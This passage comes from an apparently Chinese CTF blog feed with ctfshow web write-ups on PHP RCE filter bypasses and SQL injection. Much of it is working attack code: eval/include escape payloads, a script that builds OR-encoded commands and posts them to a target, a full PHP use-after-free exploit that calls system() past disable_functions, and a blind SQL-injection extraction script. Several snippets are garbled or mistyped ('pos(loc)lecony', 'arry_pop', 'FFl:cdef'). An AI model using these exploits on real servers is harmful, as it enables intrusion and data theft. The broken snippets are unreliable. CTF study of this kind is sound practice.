eval，主要用于过滤了相应查找的函数</h2><p>payload:<code>?a=eval($_GET[1]);&amp;1=phpinfo();</code></p>\n<p>其中 <code>1</code> 已经逃逸，可以使用任何命令</p>\n<p>(可以使用 system (“tac flag.php”) 直接查看源码)(tac 为 cat 的逆序)</p>\n<h2 id=\"分号被-ban\"><a href=\"#分号被-ban\" class=\"headerlink\" title=\"分号被 ban\"></a>分号被 ban</h2><p>可以使用文件包含的方法，<code>include%0a$_GET [1]&amp;1=phpinfo();</code></p>\n<p>此时1已经逃逸，若想查看文件内容，可使用php伪协议，base-64编码查看 (同时可以把include换成require)</p>\n<h2 id=\"data-协议\"><a href=\"#data-协议\" class=\"headerlink\" title=\"data 协议\"></a>data 协议</h2><p><code>data://text/plain,(php代码)</code></p>\n<h2 id=\"web-40\"><a href=\"#web-40\" class=\"headerlink\" title=\"web 40\"></a>web 40</h2><pre><code class=\"php\">if (isset($_GET['c'])) {\n    $c = $_GET['c'];\n    eval($c);\n} else {\n    highlight_file(__FILE__);\n}\n</code></pre>\n<p>可用<code>show_source(next(array_reverse(scandir(pos(loc)lecony))));</code></p>\n<p>或者<code>?c=eval(arry_pop(next(get_difined_vars())));</code></p>\n<p>其中 <code>get_defined_vars()</code>,获取所有的变量值，之前可以进行打印，可以发现有 post 传值，传入后会有显示，那么需要拿到传上的值， </p>\n<p>由于 post 在第二个，可用 next 获取下一个，<code>array_pop()</code>弹出，然后使用<code>eval</code>执行</p>\n<p>执行过程</p>\n<p><img data-src=\"/../../../../post_images/%E5%9B%BE%E7%89%87/web40_1.png\"></p>\n<p><img data-src=\"/../../../../post_images/%E5%9B%BE%E7%89%87/web40_2.png\"></p>\n<p>可看到由于传值，使得post有值了</p>\n<p>那么接下来就是获取并执行</p>\n<h2 id=\"web-41\"><a href=\"#web-41\" class=\"headerlink\" title=\"web 41\"></a>web 41</h2><p>这个题过滤了<code>$、+、-、^、~</code>使得异或自增和取反构造字符都无法使用，同时过滤了字母和数字。但是特意留了个或运算符 |。</p>\n<p>我们可以尝试从 ascii 为 0-255 的字符中，找到或运算能得到我们可用的字符的字符。</p>\n<p>这里先给出两个脚本<code>exp.py``rce_or.php</code>，大家以后碰到可以使用或运算绕过的可以自己手动修改下即可。</p>\n<p>生成可用字符的集合</p>\n<pre><code class=\"php\">&lt;?php\n$myfile = fopen(\"rce_or.txt\", \"w\");\n$contents=\"\";\nfor ($i=0; $i &lt; 256; $i++) { \n    for ($j=0; $j &lt;256 ; $j++) { \n\n        if($i&lt;16){\n            $hex_i='0'.dechex($i);\n        }\n        else{\n            $hex_i=dechex($i);\n        }\n        if($j&lt;16){\n            $hex_j='0'.dechex($j);\n        }\n        else{\n            $hex_j=dechex($j);\n        }\n        $preg = '/[0-9]|[a-z]|\\^|\\+|\\~|\\$|\\[|\\]|\\{|\\}|\\&amp;|\\-/i';\n        if(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j))){\n                    echo \"\";\n    }\n  \n        else{\n        $a='%'.$hex_i;\n        $b='%'.$hex_j;\n        $c=(urldecode($a)|urldecode($b));\n        if (ord($c)&gt;=32&amp;ord($c)&lt;=126) {\n            $contents=$contents.$c.\" \".$a.\" \".$b.\"\\n\";\n        }\n    }\n\n}\n}\nfwrite($myfile,$contents);\nfclose($myfile);\n</code></pre>\n<p>大体意思就是<code>从进行异或的字符中排除掉被过滤的，然后再判断异或得到的字符是否为可见字符</code></p>\n<p>传递参数<code>getflag</code></p>\n<p>脚本</p>\n<pre><code class=\"python\"># -*- coding: utf-8 -*-\nimport requests\nimport urllib\nfrom sys import *\nimport os\nos.system(\"php rce_or.php\")  #没有将 php 写入环境变量需手动运行\nif(len(argv)!=2):\n    print(\"=\"*50)\n       print('USER：python exp.py &lt;url&gt;')\n       print(\"eg：  python exp.py http://ctf.show/\")\n       print(\"=\"*50)\n       exit(0)\nurl=argv[1]\ndef action(arg):\n       s1=\"\"\n       s2=\"\"\n       for i in arg:\n           f=open(\"rce_or.txt\",\"r\")\n           while True:\n               t=f.readline()\n               if t==\"\":\n                   break\n               if t[0]==i:\n                   #print(i)\n                   s1+=t[2:5]\n                   s2+=t[6:9]\n                   break\n           f.close()\n       output=\"(\\\"\"+s1+\"\\\"|\\\"\"+s2+\"\\\")\"\n       return(output)\n   \nwhile True:\n       param=action(input(\"\\n[+] your function：\") )+action(input(\"[+] your command：\"))\n       data={\n           'c':urllib.parse.unquote(param)\n           }\n       r=requests.post(url,data=data)\n       print(\"\\n[*] result:\\n\"+r.text)\n</code></pre>\n<pre><code>                             -- 来源于[ yu22x 的博客文章](https://blog.csdn.net/miuzzx/article/details/108569080)\n</code></pre>\n<h2 id=\"web-42\"><a href=\"#web-42\" class=\"headerlink\" title=\"web 42\"></a>web 42</h2><p>双写绕过，分号分隔，分号后面被写入</p>\n<h2 id=\"web-43\"><a href=\"#web-43\" class=\"headerlink\" title=\"web 43\"></a>web 43</h2><p>源码类型同42，但过滤了分号和<code>cat</code>，可以使用<code>&amp;&amp;</code>, 用来分隔两个命令，如果前一个执行成功第二个不会执行</p>\n<h2 id=\"web-50、51\"><a href=\"#web-50、51\" class=\"headerlink\" title=\"web 50、51\"></a>web 50、51</h2><p>不用空格的命令</p>\n<p><code>?c=nl&lt;fla''g.php%7C%7Cls</code>(<code>%7C%7C</code> 为<code>||</code>) 其中不用通配符是因为不支持，使用单引号忽略</p>\n<h2 id=\"web-55\"><a href=\"#web-55\" class=\"headerlink\" title=\"web 55\"></a>web 55</h2><p>无字母 RCE</p>\n<p>可以上传文件到服务器上</p>\n<p>在本地制作文件上传表单</p>\n<p>而上传后php会把该文件放在一个临时目录下，命名规则为 php+5 位小写字母 + 大写字母，但该文件名不可控，可以使用占位符进行匹配</p>\n<p><code>/???/????????</code>而如果最后有大写字母，也可以写成<code>/???/???????[@-[]</code></p>\n<p>如果点号 . 没有过滤，在linux系统里可以使用点号. 用来执行脚本文件，即可写<code>?c=.%20/???/??????[@-[]</code></p>\n<p>然后通过抓包不断修改文件的内容</p>\n<h2 id=\"web-57\"><a href=\"#web-57\" class=\"headerlink\" title=\"web 57\"></a>web 57</h2><p>题目只要构造出 36 即可，而 $ 没有过滤，可以使用 $(()) 进行构造</p>\n<p><code>echo $(())</code>返回0，取反后<code>echo $((~$(())))</code>即为-1，那么我们可以加上37个-1再取反</p>\n<p><code>echo ~$(($((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))))</code></p>\n<p>返回36</p>\n<h2 id=\"web-62、63、64\"><a href=\"#web-62、63、64\" class=\"headerlink\" title=\"web 62、63、64\"></a>web 62、63、64</h2><ol>\n<li><code>include(\"flag.php\");echo $flag;</code></li>\n<li>或者先 include 包含 flag.php，再使用 get_defined_vars (), 获取变量名及值</li>\n<li></li>\n</ol>\n<h2 id=\"web-66\"><a href=\"#web-66\" class=\"headerlink\" title=\"web 66\"></a>web 66</h2><p><code>var_dump(scandir('*'));var_dump(scandir ('/'));</code>读取相关的目录</p>\n<h2 id=\"web-68\"><a href=\"#web-68\" class=\"headerlink\" title=\"web 68\"></a>web 68</h2><p><code>highlight_file</code>被禁，用<code>include</code>，<code>include ('/flag.txt');</code>因为没有php代码，则直接输出</p>\n<h2 id=\"web-71\"><a href=\"#web-71\" class=\"headerlink\" title=\"web 71\"></a>web 71</h2><p>内容被替换</p>\n<p>思路为提前结束，不执行下面的代码</p>\n<p><code>include('flag.txt');exit();</code></p>\n<h2 id=\"web-72\"><a href=\"#web-72\" class=\"headerlink\" title=\"web 72\"></a>web 72</h2><p><code>var_dump()</code>被禁</p>\n<p><code>scandir('/')</code>不能正确读取，因为有了<code>open_basedir()</code>, 而<code>ini_set ()</code>也被禁用，不能修改</p>\n<p>那么可以使用<code>glob</code>协议进行绕过</p>\n<pre><code class=\"php\">c=$a=\"glob:///*.txt\";\nif($b = opendir($a)){\n    while(($file = readdir($b))!== false ){\n        echo \"filename:\".$file.\"\\n\";\n    }\n    closedir($b);\n}\nexit();// 为了绕过后面的替换内容\n</code></pre>\n<p>虽然知道flag的文件名，但是无法读取</p>\n<p>xxxxxxxxxx&nbsp;?file=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=a.phpphp</p>\n<pre><code class=\"php\">?&gt;&lt;?php\npwn(\"cat /flag0.txt\");\nfunction pwn($cmd) {\n    global $abc, $helper, $backtrace;\n    class Vuln {\n        public $a;\n        public function __destruct() { \n            global $backtrace; \n            unset($this-&gt;a);\n            $backtrace = (new Exception)-&gt;getTrace(); # ;)\n            if(!isset($backtrace[1]['args'])) { # PHP &gt;= 7.4\n                $backtrace = debug_backtrace();\n            }\n        }\n    }\n    class Helper {\n        public $a, $b, $c, $d;\n    }\n    function str2ptr(&amp;$str, $p = 0, $s = 8) {\n        $address = 0;\n        for($j = $s-1; $j &gt;= 0; $j--) {\n            $address &lt;&lt;= 8;\n            $address |= ord($str[$p+$j]);\n        }\n        return $address;\n    }\n    function ptr2str($ptr, $m = 8) {\n        $out = \"\";\n        for ($i=0; $i &lt; $m; $i++) {\n            $out .= sprintf(\"%c\",($ptr &amp; 0xff));\n            $ptr &gt;&gt;= 8;\n        }\n        return $out;\n    }\n    function write(&amp;$str, $p, $v, $n = 8) {\n        $i = 0;\n        for($i = 0; $i &lt; $n; $i++) {\n            $str[$p + $i] = sprintf(\"%c\",($v &amp; 0xff));\n            $v &gt;&gt;= 8;\n        }\n    }\n    function leak($addr, $p = 0, $s = 8) {\n        global $abc, $helper;\n        write($abc, 0x68, $addr + $p - 0x10);\n        $leak = strlen($helper-&gt;a);\n        if($s != 8) { $leak %= 2 &lt;&lt; ($s * 8) - 1; }\n        return $leak;\n    }\n    function parse_elf($base) {\n        $e_type = leak($base, 0x10, 2);\n        $e_phoff = leak($base, 0x20);\n        $e_phentsize = leak($base, 0x36, 2);\n        $e_phnum = leak($base, 0x38, 2);\n        for($i = 0; $i &lt; $e_phnum; $i++) {\n            $header = $base + $e_phoff + $i * $e_phentsize;\n            $p_type  = leak($header, 0, 4);\n            $p_flags = leak($header, 4, 4);\n            $p_vaddr = leak($header, 0x10);\n            $p_memsz = leak($header, 0x28);\n            if($p_type == 1 &amp;&amp; $p_flags == 6) { # PT_LOAD, PF_Read_Write\n                # handle pie\n                $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;\n                $data_size = $p_memsz;\n            } else if($p_type == 1 &amp;&amp; $p_flags == 5) { # PT_LOAD, PF_Read_exec\n                $text_size = $p_memsz;\n            }\n        }\n        if(!$data_addr || !$text_size || !$data_size)\n            return false;\n        return [$data_addr, $text_size, $data_size];\n    }\n    function get_basic_funcs($base, $elf) {\n        list($data_addr, $text_size, $data_size) = $elf;\n        for($i = 0; $i &lt; $data_size / 8; $i++) {\n            $leak = leak($data_addr, $i * 8);\n            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) {\n                $deref = leak($leak);\n                # 'constant' constant check\n                if($deref != 0x746e6174736e6f63)\n                    continue;\n            } else continue;\n            $leak = leak($data_addr, ($i + 4) * 8);\n            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) {\n                $deref = leak($leak);\n                # 'bin2hex' constant check\n                if($deref != 0x786568326e6962)\n                    continue;\n            } else continue;\n            return $data_addr + $i * 8;\n        }\n    }\n    function get_binary_base($binary_leak) {\n        $base = 0;\n        $start = $binary_leak &amp; 0xfffffffffffff000;\n        for($i = 0; $i &lt; 0x1000; $i++) {\n            $addr = $start - 0x1000 * $i;\n            $leak = leak($addr, 0, 7);\n            if($leak == 0x10102464c457f) { # ELF header\n                return $addr;\n            }\n        }\n    }\n    function get_system($basic_funcs) {\n        $addr = $basic_funcs;\n        do {\n            $f_entry = leak($addr);\n            $f_name = leak($f_entry, 0, 6);\n            if($f_name == 0x6d6574737973) { # system\n                return leak($addr + 8);\n            }\n            $addr += 0x20;\n        } while($f_entry != 0);\n        return false;\n    }\n    function my_str_repeat($a,$b){\n        $s = '';\n        for($i = 0; $i &lt;= $b;$i++){\n            $s.=$a;\n        }  \n        return $s;\n    }\n    function trigger_uaf($arg) {\n        # str_shuffle prevents opcache string interning\n        $arg = str_shuffle(my_str_repeat('A', 79));\n        $vuln = new Vuln();\n        $vuln-&gt;a = $arg;\n    }\n    if(stristr(PHP_OS, 'WIN')) {\n        die('This PoC is for *nix systems only.');\n    }\n    $n_alloc = 10; # increase this value if UAF fails\n    $contiguous = [];\n    for($i = 0; $i &lt; $n_alloc; $i++)\n        $contiguous[] = str_shuffle(my_str_repeat('A', 79));\n    trigger_uaf('x');\n    $abc = $backtrace[1]['args'][0];\n    $helper = new Helper;\n    $helper-&gt;b = function ($x) { };\n    if(strlen($abc) == 79 || strlen($abc) == 0) {\n        die(\"UAF failed\");\n    }\n    # leaks\n    $closure_handlers = str2ptr($abc, 0);\n    $php_heap = str2ptr($abc, 0x58);\n    $abc_addr = $php_heap - 0xc8;\n    # fake value\n    write($abc, 0x60, 2);\n    write($abc, 0x70, 6);\n    # fake reference\n    write($abc, 0x10, $abc_addr + 0x60);\n    write($abc, 0x18, 0xa);\n    $closure_obj = str2ptr($abc, 0x20);\n    $binary_leak = leak($closure_handlers, 8);\n    if(!($base = get_binary_base($binary_leak))) {\n        die(\"Couldn't determine binary base address\");\n    }\n    if(!($elf = parse_elf($base))) {\n        die(\"Couldn't parse ELF header\");\n    }\n    if(!($basic_funcs = get_basic_funcs($base, $elf))) {\n        die(\"Couldn't get basic_functions address\");\n    }\n    if(!($zif_system = get_system($basic_funcs))) {\n        die(\"Couldn't get zif_system address\");\n    }\n    # fake closure object\n    $fake_obj_offset = 0xd0;\n    for($i = 0; $i &lt; 0x110; $i += 8) {\n        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));\n    }\n    # pwn\n    write($abc, 0x20, $abc_addr + $fake_obj_offset);\n    write($abc, 0xd0 + 0x38, 1, 4); # internal func type\n    write($abc, 0xd0 + 0x68, $zif_system); # internal func handler\n    ($helper-&gt;b)($cmd);\n    exit();\n}\nexit();\n</code></pre>\n<h2 id=\"web-75\"><a href=\"#web-75\" class=\"headerlink\" title=\"web 75\"></a>web 75</h2><p>先通过glob读取文件目录</p>\n<p>用数据库pdo读取</p>\n<pre><code class=\"php\">try {\n        $dbh = new  PDO('mysql : host=localhost ; dbname=ctftraining', ' root', ' root');\n        foreach ($dbh-&gt;query('select- load_ file(\"/flag36.txt\") ') as  $row) {\n            echo ($row[0]) . \"I\";\n        }\n        $dbh = null;\n    } catch (PDOException $e) {\n        echo $e-&gt;getMessage();\n        exit(0);\n    }\n    exit(0);\n</code></pre>\n<h2 id=\"web-77\"><a href=\"#web-77\" class=\"headerlink\" title=\"web 77\"></a>web 77</h2><p>盲测特性</p>\n<pre><code class=\"php\">c=$ffi = FFl:cdef(\"int system(const char *command);\");\n$a='/readflag&gt; 1.txt';\nff-&gt;system($a);\n</code></pre>\n<h2 id=\"web-118\"><a href=\"#web-118\" class=\"headerlink\" title=\"web 118\"></a>web 118</h2><p><code>${PATH:~A}${PWD:~A}$IFS????.???</code></p>\n<p>nl 命令</p>\n<h2 id=\"web-119\"><a href=\"#web-119\" class=\"headerlink\" title=\"web 119\"></a>web 119</h2>",
            "tags": [
                "CTF",
                "ctfshow"
            ]
        },
        {
            "id": "http://dpm12345.cn/posts/96bab31d/",
            "url": "http://dpm12345.cn/posts/96bab31d/",
            "title": "other",
            "date_published": "2022-10-04T03:43:10.000Z",
            "content_html": "<h1 id=\"web\"><a class=\"anchor\" href=\"#web\">#</a> web</h1>\n<h2 id=\"web-4\"><a class=\"anchor\" href=\"#web-4\">#</a> web 4</h2>\n<p>日志文件   蚁剑</p>\n<h2 id=\"web-5\"><a class=\"anchor\" href=\"#web-5\">#</a> web 5</h2>\n<p><strong>开头 0e 的 md5</strong></p>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre>QNKCDZO：0e830400451993494058024219903391 </pre></td></tr><tr><td data-num=\"2\"></td><td><pre>240610708：0e462097431906509019562988736854 </pre></td></tr><tr><td data-num=\"3\"></td><td><pre>s878926199a 0e545993274517709034328855841020 </pre></td></tr><tr><td data-num=\"4\"></td><td><pre>s155964671a 0e342768416822451524974117254469 </pre></td></tr><tr><td data-num=\"5\"></td><td><pre>s214587387a 0e848240448830537924465865611904 </pre></td></tr><tr><td data-num=\"6\"></td><td><pre>s1091221200a 0e940624217856561557816327384675 </pre></td></tr><tr><td data-num=\"7\"></td><td><pre>s1885207154a 0e509367213418206700842008763514 </pre></td></tr><tr><td data-num=\"8\"></td><td><pre>s1502113478a 0e861580163291561247404381396064 </pre></td></tr><tr><td data-num=\"9\"></td><td><pre>s1836677006a 0e481036490867661113260034900752 </pre></td></tr><tr><td data-num=\"10\"></td><td><pre>s1184209335a 0e072485820392773389523109082030 </pre></td></tr><tr><td data-num=\"11\"></td><td><pre>s1665632922a 0e731198061491163073197128363787 </pre></td></tr><tr><td data-num=\"12\"></td><td><pre>s532378020a 0e220463095855511507588041205815</pre></td></tr></tbody></table></figure><h2 id=\"web-6\"><a class=\"anchor\" href=\"#web-6\">#</a> web 6</h2>\n<p>输入万能密码，显示 <code>sql injection error</code></p>\n<p>猜测空格过滤，绕过，发现能正常回显，之后便是正常爆库、表、字段了</p>\n<h2 id=\"web-7\"><a class=\"anchor\" href=\"#web-7\">#</a> web 7</h2>\n<p>同样的也是空格过滤</p>\n<p>在输入时同时也发现对单引号  <code>'</code>  的滤</p>\n<h2 id=\"web-8\"><a class=\"anchor\" href=\"#web-8\">#</a> web 8</h2>\n<p>首先确认该题为数字型注入 同样也是过滤了空格，之后可发现过滤了逗号，那么联合查询不能使用了，可以采用布尔盲注 下面是逗号的绕过方法</p>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre>' and ascii (substr ((select database ()),1,1))=xx #</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>这样的话写个脚本很容易跑出来了，过滤逗号之后可以变成这样</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>' and ascii (substr ((select database ()) from 1 for 1))=xx #</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>这应该是 substring 函数的两种用法</pre></td></tr></tbody></table></figure><p>使用如下程序爆库</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> requests</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>s <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>session<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>table <span class=\"token operator\">=</span> <span class=\"token string\">''</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>url <span class=\"token operator\">=</span> <span class=\"token string\">'http://41ca0d79-9b41-4a09-b5e6-a5d1fe2a3a03.challenge.ctf.show/index.php'</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">50</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span><span class=\"token comment\">#估计查询到的字段长度</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">for</span> j <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">31</span><span class=\"token punctuation\">,</span> <span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span><span class=\"token comment\">#从可读取的 ascii 码开始到结束</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token comment\"># 爆表名</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        payload <span class=\"token operator\">=</span> <span class=\"token string\">\"ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database())from/**/%s/**/for/**/1))=%s#\"</span><span class=\"token operator\">%</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>j<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token comment\">#爆字段名 flag</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token comment\">#payload = \"ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=0x666C6167)from/**/%s/**/for/**/1))=%s#\"%(str(i),str(j))</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token comment\">#读取 flag</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token comment\">#payload = \"ascii(substr((select/**/flag/**/from/**/flag)from/**/%s/**/for/**/1))=%s#\"%(str(i), str(j))</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        re <span class=\"token operator\">=</span> s<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>url<span class=\"token operator\">=</span>url <span class=\"token operator\">+</span> <span class=\"token string\">'?id=0/**/or/**/'</span> <span class=\"token operator\">+</span> payload<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>text</pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token string\">'I asked nothing'</span> <span class=\"token keyword\">in</span> re<span class=\"token punctuation\">:</span>  <span class=\"token comment\">#是否成功   </span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>            table <span class=\"token operator\">+=</span> <span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span>j<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>table<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>            <span class=\"token keyword\">break</span></pre></td></tr></tbody></table></figure><p>得到 flag</p>\n<h2 id=\"web-9\"><a class=\"anchor\" href=\"#web-9\">#</a> web 9</h2>\n<p>访问  <code>/robots.txt</code>  可以知道源码文件</p>\n<p>下载得到</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>        <span class=\"token variable\">$flag</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t\t<span class=\"token variable\">$password</span><span class=\"token operator\">=</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'password'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$password</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&gt;</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t\t\t<span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"password error\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t\t<span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\t\t<span class=\"token variable\">$sql</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"select * from user where username ='admin' and password ='\"</span><span class=\"token operator\">.</span><span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$password</span><span class=\"token punctuation\">,</span><span class=\"token constant boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"'\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t\t<span class=\"token variable\">$result</span><span class=\"token operator\">=</span><span class=\"token function\">mysqli_query</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$con</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$sql</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t\t\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">mysqli_num_rows</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$result</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&gt;</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t\t\t\t\t<span class=\"token keyword\">while</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$row</span><span class=\"token operator\">=</span><span class=\"token function\">mysqli_fetch_assoc</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$result</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\t\t\t\t\t\t <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"登陆成功&lt;br&gt;\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t\t\t\t\t\t <span class=\"token keyword\">echo</span> <span class=\"token variable\">$flag</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\t\t\t\t\t <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t\t\t<span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token delimiter important\">?&gt;</span></pre></td></tr></tbody></table></figure><p><code>$sql=\"select * from user where username ='admin' and password ='\".md5($password,true).\"'\";</code></p>\n<p>其中</p>\n<p><img data-src=\"../../../post_images/%E5%9B%BE%E7%89%87/3544233-69332a9de6e8291b.png\" alt=\"\"></p>\n<p>由此如果想要绕过，那么应该使得 <code>password</code>  转换成 16 进制的 hex 值以后，再将其转换成字符串后包含 <code>' 'or ' 6'&lt;trash&gt;</code></p>\n<p>有一个字符串为  <code>ffifdyop</code> , 经过上述操作满足该条件</p>\n<p>构成 <code>SELECT * FROM admin WHERE pass=' 'or ' 6'&lt;trash&gt;</code></p>\n<p>就可以注入了</p>\n<h2 id=\"web-10\"><a class=\"anchor\" href=\"#web-10\">#</a> web 10</h2>\n<p>这里介绍两个 mysql 语句</p>\n<ol>\n<li>\n<p>group by（将结果集中的数据行根据选择列的值进行逻辑分组） 不加 group by 时的输出如下</p>\n<p><img data-src=\"../../../post_images/%E5%9B%BE%E7%89%87/20200217171754632.png\" alt=\"\"></p>\n<p>在使用 group by 以后会按照 password 中的值进行排列</p>\n</li>\n<li>\n<p>with rollup（group by 后可以跟 with rollup，表示在进行分组统计的基础上再次进行汇总统计） 来看实例</p>\n<p><img data-src=\"../../../post_images/%E5%9B%BE%E7%89%87/20200217171715827.png\" alt=\"\"></p>\n<p>结果中将会多出一行，其中 <code>password</code>  列为 null， <code>count（*)</code>  为统计和。</p>\n</li>\n</ol>\n<p>这里我们就可以通过骚姿势绕过了。</p>\n<p>其中  <code>/**/</code>  是为了绕过空格过滤</p>\n<p><code>payload:username=admin'/**/or/**/1=1/**/group/**/by/**/password/**/with/**/rollup#&amp;password=</code></p>\n<p>因为加入 with rollup 后 password 有一行为 NULL，我们只要输入空密码使得 <code>(NULL==NULL)</code>  即可满足 <code>$password==$row['password']</code>  的限制成功登陆</p>\n<p>登录成功即可显示 flag</p>\n<h2 id=\"web-11\"><a class=\"anchor\" href=\"#web-11\">#</a> web 11</h2>\n<p>看代码</p>\n<p>要使 password=$_SESSION ['password']</p>\n<p>而 session 在 cookie 里，根据提示，那么删掉 cookie 后提交空密码即可</p>\n<h2 id=\"web-12\"><a class=\"anchor\" href=\"#web-12\">#</a> web 12</h2>\n<p>查看源码，有注释 <code>hit:?cmd=</code> ，题目 hint 为 glob 绕过</p>\n<p>查找相关函数后，payload： <code>?cmd=print_r(glob(\"*.php\"));</code>  或 <code>print_r(scandir(\".\"));</code></p>\n<p>得到一个 php 文件名，再使用提示的 highlight 查看源码</p>\n<p>得到 flag</p>\n<h2 id=\"web-13\"><a class=\"anchor\" href=\"#web-13\">#</a> web 13</h2>\n<p>文件上传</p>\n<p>访问  <code>upload.php.bak </code> 下载源码</p>\n<p>知道做了很多限制，php 不能上传，文件内容不超过 24, 文件名小于 9，文件后缀不大于 3</p>\n<p>这里用到了上传 